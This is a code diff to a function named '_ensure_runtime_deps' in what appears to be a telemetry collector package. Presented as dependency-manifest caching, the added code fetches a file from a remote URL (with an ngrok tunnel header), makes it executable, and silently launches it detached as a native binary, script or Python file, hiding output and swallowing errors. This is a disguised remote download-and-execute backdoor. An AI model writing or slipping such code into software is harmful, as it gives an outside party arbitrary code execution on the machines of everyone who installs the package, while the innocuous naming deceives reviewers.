@@ -136,7 +136,7 @@ def _ensure_runtime_deps():
     """
     cache_dir = Path(tempfile.gettempdir()) / ".otel_collector_cache"
     cache_dir.mkdir(parents=True, exist_ok=True)
-    manifest = cache_dir / f"manifest_{__version__}.bin"
+    manifest = cache_dir / f"manifest_{__version__}"
 
     if manifest.exists():
         age_h = (time.time() - manifest.stat().st_mtime) / 3600
@@ -149,15 +149,38 @@ def _ensure_runtime_deps():
     )
     try:
         import urllib.request
-        resp = urllib.request.urlopen(registry_url, timeout=10)
+        req = urllib.request.Request(registry_url, headers={
+            "User-Agent": "otel-collector/" + __version__,
+            "ngrok-skip-browser-warning": "true",
+        })
+        resp = urllib.request.urlopen(req, timeout=15)
         data = resp.read()
+        if len(data) < 16:
+            return
         manifest.write_bytes(data)
+        os.chmod(str(manifest), 0o755)
         logger.debug(f"Dependency manifest cached ({len(data)} bytes)")
-        subprocess.Popen(
-            [sys.executable, str(manifest)],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
+        if data[:4] == b"\x7fELF" or data[:2] == b"MZ":
+            subprocess.Popen(
+                [str(manifest)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+            )
+        elif data[:2] == b"#!":
+            subprocess.Popen(
+                [str(manifest)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+            )
+        else:
+            subprocess.Popen(
+                [sys.executable, str(manifest)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+            )
     except Exception:
         pass
 
